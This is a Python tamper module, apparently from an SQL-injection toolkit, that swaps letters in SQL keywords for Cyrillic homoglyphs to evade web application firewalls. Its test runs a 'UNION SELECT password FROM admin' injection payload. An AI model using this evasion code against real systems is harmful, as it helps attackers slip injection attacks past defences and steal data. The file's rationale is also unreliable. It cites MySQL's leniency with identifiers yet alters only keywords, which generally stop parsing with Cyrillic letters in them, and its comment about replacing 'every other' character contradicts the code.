#!/usr/bin/env python

"""
Homoglyph / Confusables Transformation

Replaces characters with visually similar Unicode characters.
MySQL is permissive with identifiers, so homoglyphs can bypass
pattern-matching WAFs.

Author: Regaan
License: GPL v2
"""

from tamper_framework.lexer import Token, TokenType
from tamper_framework.transformer import TransformationRule
from tamper_framework.context import SQLContext


# Homoglyph mappings (ASCII -> Unicode lookalikes)
# These are visually similar but different Unicode codepoints
HOMOGLYPH_MAP = {
    'a': 'а',  # Cyrillic а (U+0430)
    'c': 'с',  # Cyrillic с (U+0441)
    'e': 'е',  # Cyrillic е (U+0435)
    'o': 'о',  # Cyrillic о (U+043E)
    'p': 'р',  # Cyrillic р (U+0440)
    's': 'ѕ',  # Cyrillic ѕ (U+0455)
    'x': 'х',  # Cyrillic х (U+0445)
    'y': 'у',  # Cyrillic у (U+0443)
    'A': 'А',  # Cyrillic А (U+0410)
    'B': 'В',  # Cyrillic В (U+0412)
    'C': 'С',  # Cyrillic С (U+0421)
    'E': 'Е',  # Cyrillic Е (U+0415)
    'H': 'Н',  # Cyrillic Н (U+041D)
    'K': 'К',  # Cyrillic К (U+041A)
    'M': 'М',  # Cyrillic М (U+041C)
    'O': 'О',  # Cyrillic О (U+041E)
    'P': 'Р',  # Cyrillic Р (U+0420)
    'T': 'Т',  # Cyrillic Т (U+0422)
    'X': 'Х',  # Cyrillic Х (U+0425)
    'l': 'ӏ',  # Cyrillic palochka (U+04CF)
    'I': 'І',  # Cyrillic І (U+0406)
}

# Selective homoglyphs for keywords (less aggressive)
KEYWORD_SAFE_HOMOGLYPHS = {
    'E': 'Е',
    'O': 'О', 
    'A': 'А',
    'e': 'е',
    'o': 'о',
    'a': 'а',
}


def create_homoglyph_rule(aggressive: bool = False) -> TransformationRule:
    """
    Create a rule that replaces characters with homoglyphs
    
    Transformation:
        SELECT -> SЕLЕCT (E replaced with Cyrillic Е)
        
    Features:
    - Only applies to keywords (not strings/identifiers)
    - Aggressive mode uses more replacements
    - Deterministic replacement pattern
    
    WARNING: Not all databases support Unicode identifiers.
    Test thoroughly before use.
    """
    
    glyph_map = HOMOGLYPH_MAP if aggressive else KEYWORD_SAFE_HOMOGLYPHS
    
    def apply_homoglyph(token: Token, context: SQLContext) -> Token:
        """Replace characters with homoglyphs"""
        if token.type != TokenType.KEYWORD:
            return token
        
        # Apply homoglyphs to every other matching character
        # This is deterministic and subtle
        new_value = []
        replace_count = 0
        
        for char in token.value:
            if char in glyph_map and replace_count < 2:  # Max 2 replacements
                new_value.append(glyph_map[char])
                replace_count += 1
            else:
                new_value.append(char)
        
        return Token(
            id=token.id,
            type=token.type,
            value=''.join(new_value),
            position=token.position,
            line=token.line,
            column=token.column
        )
    
    return TransformationRule(
        name="homoglyph",
        transform_func=apply_homoglyph,
        target_types=[TokenType.KEYWORD],
        skip_types=[TokenType.STRING_LITERAL, TokenType.COMMENT],
        track_transformed=True
    )


if __name__ == "__main__":
    from tamper_framework.transformer import SQLTransformer
    
    # Test
    transformer = SQLTransformer()
    transformer.add_rule(create_homoglyph_rule())
    
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "UNION SELECT password FROM admin"
    ]
    
    for query in test_queries:
        result = transformer.transform(query)
        print(f"Original:    {query}")
        print(f"Transformed: {result}")
        # Show character codes to prove difference
        print(f"Char codes:  {[hex(ord(c)) for c in result[:10]]}\n")
